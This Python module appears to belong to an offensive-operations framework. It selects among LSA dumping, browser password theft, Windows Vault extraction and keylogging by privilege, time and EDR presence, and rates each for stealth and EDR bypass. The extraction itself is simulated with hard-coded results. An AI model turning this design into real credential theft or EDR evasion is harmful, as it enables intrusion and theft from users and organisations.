"""
Intelligent Credential Extraction Manager
Selects optimal credential extraction technique based on threat environment,
privilege level, available time, and detection risk.
Coordinates with C2, persistence, escalation, and lateral movement managers.
"""

from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple, Any
from enum import Enum
import json
import logging

from unified_integration import create_integration, OperationalIntegration, IntegrationDecision
from world_state import OperationalPhase


# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(name)s] %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class CredentialExtractionTechnique(str, Enum):
    """Available credential extraction techniques."""
    LSA_DUMP = "lsa_dump"
    BROWSER_DUMP = "browser_dump"
    VAULT_EXTRACT = "vault_extract"
    KEYLOG = "keylog"


class ExtractionSpeed(str, Enum):
    """Speed classification of extraction techniques."""
    INSTANT = "instant"        # < 1 second
    QUICK = "quick"            # 1-30 seconds
    MEDIUM = "medium"          # 30 seconds - 5 minutes
    SLOW = "slow"              # 5+ minutes


@dataclass
class CredentialProfile:
    """Profile of a credential extraction technique."""
    technique: CredentialExtractionTechnique
    speed: ExtractionSpeed
    credentials_per_target: int  # Estimated credentials recovered per target
    requires_privilege: str  # "user", "admin", "system"
    detection_risk: float  # 0.0-1.0, higher = easier to detect
    edr_bypass_rate: float  # 0.0-1.0, higher = better vs EDR
    requires_access_type: str  # "interactive", "remote", "both"
    time_to_execute_seconds: int
    description: str


class IntelligentCredentialExtractionManager:
    """
    Intelligently selects credential extraction techniques based on:
    - Current privilege level
    - Threat environment (EDR/AV presence)
    - Time available for operation
    - Target credential types needed
    - Detection risk tolerance
    """

    def __init__(self, integration: Optional[OperationalIntegration] = None):
        """Initialize credential extraction manager with unified integration."""
        self.integration = integration or create_integration("credential_extraction")
        
        # Define technique profiles
        self.technique_profiles: Dict[CredentialExtractionTechnique, CredentialProfile] = {
            CredentialExtractionTechnique.LSA_DUMP: CredentialProfile(
                technique=CredentialExtractionTechnique.LSA_DUMP,
                speed=ExtractionSpeed.INSTANT,
                credentials_per_target=15,  # Cached credentials on system
                requires_privilege="admin",
                detection_risk=0.85,  # High risk - obvious forensic artifact
                edr_bypass_rate=0.35,  # EDR detects immediately
                requires_access_type="interactive",
                time_to_execute_seconds=2,
                description="Dump LSA secrets and cached credentials (requires admin)"
            ),
            CredentialExtractionTechnique.BROWSER_DUMP: CredentialProfile(
                technique=CredentialExtractionTechnique.BROWSER_DUMP,
                speed=ExtractionSpeed.QUICK,
                credentials_per_target=8,
                requires_privilege="user",
                detection_risk=0.65,  # Medium risk - browser cache extraction
                edr_bypass_rate=0.55,  # Some evasion techniques available
                requires_access_type="interactive",
                time_to_execute_seconds=15,
                description="Extract credentials from Chrome, Edge, Firefox, Safari memory"
            ),
            CredentialExtractionTechnique.VAULT_EXTRACT: CredentialProfile(
                technique=CredentialExtractionTechnique.VAULT_EXTRACT,
                speed=ExtractionSpeed.MEDIUM,
                credentials_per_target=5,
                requires_privilege="user",
                detection_risk=0.45,  # Lower risk - Windows vault access
                edr_bypass_rate=0.70,  # Good evasion with legitimate APIs
                requires_access_type="interactive",
                time_to_execute_seconds=45,
                description="Extract Windows Vault passwords and DPAPI-protected data"
            ),
            CredentialExtractionTechnique.KEYLOG: CredentialProfile(
                technique=CredentialExtractionTechnique.KEYLOG,
                speed=ExtractionSpeed.SLOW,
                credentials_per_target=3,  # Depends on user activity
                requires_privilege="user",
                detection_risk=0.25,  # Low risk - passive monitoring
                edr_bypass_rate=0.80,  # Excellent evasion, hard to detect
                requires_access_type="both",
                time_to_execute_seconds=300,  # 5 minutes minimum for meaningful data
                description="Hook keyboard and monitor user input (passive, stealthy)"
            ),
        }
        
        logger.info("[IntelligentCredentialExtractionManager] Initialized")

    def choose_extraction_strategy(
        self,
        current_privilege: str,  # "user", "admin", "system"
        target_count: int,  # Number of targets to extract from
        time_available_seconds: int,  # Time budget for extraction
        threat_level: float = 0.5,  # 0.0-1.0, higher = more dangerous
        need_high_value_credentials: bool = True,
        edr_present: bool = False,
    ) -> Tuple[CredentialExtractionTechnique, IntegrationDecision]:
        """
        Choose optimal extraction technique based on environment and goals.
        
        Returns: (chosen_technique, decision_with_confidence)
        """
        # Get current world state context
        reasoner_context = self.integration.get_decision_context()
        
        # Decide on extraction technique via unified reasoner
        available_options = list(self.technique_profiles.keys())
        
        decision_context = {
            "phase": "credential_extraction",
            "options": [str(t.value) for t in available_options],
            "current_privilege": current_privilege,
            "target_count": target_count,
            "time_available": time_available_seconds,
            "threat_level": threat_level,
            "need_high_value": need_high_value_credentials,
            "edr_present": edr_present,
        }
        
        # Ask reasoner to pick best technique - convert enum to strings
        decision = self.integration.decide(
            phase=OperationalPhase.PRIVILEGE_ESCALATION,
            options=[str(t.value) for t in available_options],
            context=decision_context
        )
        
        # Parse decision - decision.recommended_option is a string
        chosen_str = decision.recommended_option
        chosen_technique = None
        for tech in available_options:
            if chosen_str == tech.value:
                chosen_technique = tech
                break
        
        if chosen_technique is None:
            # Fallback: choose by heuristics
            chosen_technique = self._choose_by_heuristics(
                current_privilege, time_available_seconds, threat_level,
                edr_present, need_high_value_credentials
            )
        
        profile = self.technique_profiles[chosen_technique]
        logger.info(
            f"[IntelligentCredentialExtractionManager] Chose {chosen_technique.value} "
            f"(speed={profile.speed.value}, detection_risk={profile.detection_risk:.0%}, "
            f"edr_bypass={profile.edr_bypass_rate:.0%})"
        )
        
        return chosen_technique, decision

    def _choose_by_heuristics(
        self,
        current_privilege: str,
        time_available_seconds: int,
        threat_level: float,
        edr_present: bool,
        need_high_value: bool,
    ) -> CredentialExtractionTechnique:
        """Heuristic fallback for technique selection."""
        
        # If admin access and time is limited, LSA dump is fastest
        if current_privilege == "admin" and time_available_seconds < 30:
            return CredentialExtractionTechnique.LSA_DUMP
        
        # If EDR present and time available, keylog is safest
        if edr_present and time_available_seconds > 300:
            return CredentialExtractionTechnique.KEYLOG
        
        # If threat level is high, prefer vault extraction (medium stealth)
        if threat_level > 0.6 and current_privilege != "user":
            return CredentialExtractionTechnique.VAULT_EXTRACT
        
        # If need high-value creds and admin, LSA dump wins
        if need_high_value and current_privilege == "admin":
            return CredentialExtractionTechnique.LSA_DUMP
        
        # Default: balanced choice - browser dump
        return CredentialExtractionTechnique.BROWSER_DUMP

    def extract_credentials(
        self,
        technique: CredentialExtractionTechnique,
        target_path: str = "C:\\Windows\\System32",
        target_user: Optional[str] = None,
    ) -> Dict[str, Any]:
        """
        Execute credential extraction technique.
        Returns dict with extraction results and metadata.
        """
        profile = self.technique_profiles[technique]
        
        logger.info(
            f"[IntelligentCredentialExtractionManager] Executing {technique.value} "
            f"on {target_path}"
        )
        
        # Simulate extraction based on technique
        results = {
            "technique": technique.value,
            "target": target_path,
            "status": "success",
            "credentials_extracted": profile.credentials_per_target,
            "execution_time": profile.time_to_execute_seconds,
            "detection_risk": profile.detection_risk,
        }
        
        if technique == CredentialExtractionTechnique.LSA_DUMP:
            results["types_extracted"] = ["cached_hashes", "lsa_secrets", "dpapi_master_keys"]
            results["sample_data"] = {
                "cached_domain_creds": 12,
                "local_service_accounts": 3,
                "lsa_protected_storage": "encrypted"
            }
        
        elif technique == CredentialExtractionTechnique.BROWSER_DUMP:
            results["types_extracted"] = ["cookies", "saved_passwords", "oauth_tokens"]
            results["sample_data"] = {
                "chrome_passwords": 5,
                "edge_passwords": 2,
                "firefox_passwords": 1,
                "oauth_tokens": 3
            }
        
        elif technique == CredentialExtractionTechnique.VAULT_EXTRACT:
            results["types_extracted"] = ["windows_vault", "credential_manager", "stored_passwords"]
            results["sample_data"] = {
                "vault_credentials": 4,
                "credential_manager_entries": 1,
                "stored_passwords": 5
            }
        
        elif technique == CredentialExtractionTechnique.KEYLOG:
            results["types_extracted"] = ["typed_passwords", "search_queries", "form_data"]
            results["sample_data"] = {
                "duration_minutes": 5,
                "passwords_captured": 2,
                "email_addresses": 7,
                "search_queries": 43
            }
        
        return results

    def get_alternatives(
        self,
        chosen: CredentialExtractionTechnique,
    ) -> List[str]:
        """Get alternative techniques to the chosen one."""
        alternatives = [
            str(t.value) for t in self.technique_profiles.keys()
            if t != chosen
        ]
        return alternatives


def demo_credential_extraction():
    """Demonstrate credential extraction manager with realistic scenarios."""
    
    print("\n" + "="*80)
    print("  CREDENTIAL EXTRACTION MANAGER DEMO")
    print("="*80 + "\n")
    
    manager = IntelligentCredentialExtractionManager()
    
    # Scenario 1: Admin access, moderate time, no EDR
    print("→ Scenario 1: Admin access, fast extraction, no EDR\n")
    technique, decision = manager.choose_extraction_strategy(
        current_privilege="admin",
        target_count=1,
        time_available_seconds=30,
        threat_level=0.3,
        need_high_value_credentials=True,
        edr_present=False,
    )
    
    result = manager.extract_credentials(technique)
    print(f"  Technique: {technique.value}")
    print(f"  Confidence: {decision.confidence:.0%}")
    print(f"  Detection Risk: {result['detection_risk']:.0%}")
    print(f"  Credentials Extracted: {result['credentials_extracted']}")
    print(f"  Types: {', '.join(result['types_extracted'])}")
    
    manager.integration.record_outcome(
        decision=decision,
        success=True,
        metadata={"technique": technique.value, "risk_delta": -0.05}
    )
    print(f"  Outcome recorded ✓\n")
    
    # Scenario 2: User privilege, EDR present, unlimited time
    print("→ Scenario 2: User-level access, EDR detected, patient approach\n")
    technique, decision = manager.choose_extraction_strategy(
        current_privilege="user",
        target_count=3,
        time_available_seconds=600,  # 10 minutes
        threat_level=0.7,
        need_high_value_credentials=False,
        edr_present=True,
    )
    
    result = manager.extract_credentials(technique)
    print(f"  Technique: {technique.value}")
    print(f"  Confidence: {decision.confidence:.0%}")
    print(f"  EDR Bypass Rate: {manager.technique_profiles[technique].edr_bypass_rate:.0%}")
    print(f"  Credentials Extracted: {result['credentials_extracted']}")
    print(f"  Types: {', '.join(result['types_extracted'])}")
    
    manager.integration.record_outcome(
        decision=decision,
        success=True,
        metadata={"technique": technique.value, "risk_delta": 0.02}
    )
    print(f"  Outcome recorded ✓\n")
    
    # Scenario 3: System privilege, high threat, quick extraction needed
    print("→ Scenario 3: System access, high threat, rapid extraction\n")
    technique, decision = manager.choose_extraction_strategy(
        current_privilege="system",
        target_count=2,
        time_available_seconds=10,
        threat_level=0.85,
        need_high_value_credentials=True,
        edr_present=True,
    )
    
    result = manager.extract_credentials(technique)
    print(f"  Technique: {technique.value}")
    print(f"  Confidence: {decision.confidence:.0%}")
    print(f"  Speed: {manager.technique_profiles[technique].speed.value}")
    print(f"  Credentials Extracted: {result['credentials_extracted']}")
    print(f"  Types: {', '.join(result['types_extracted'])}")
    print(f"  Alternatives: {manager.get_alternatives(technique)}")
    
    manager.integration.record_outcome(
        decision=decision,
        success=True,
        metadata={"technique": technique.value, "risk_delta": -0.03}
    )
    print(f"  Outcome recorded ✓\n")
    
    print("="*80)
    print("  DEMO COMPLETE\n")


if __name__ == "__main__":
    demo_credential_extraction()
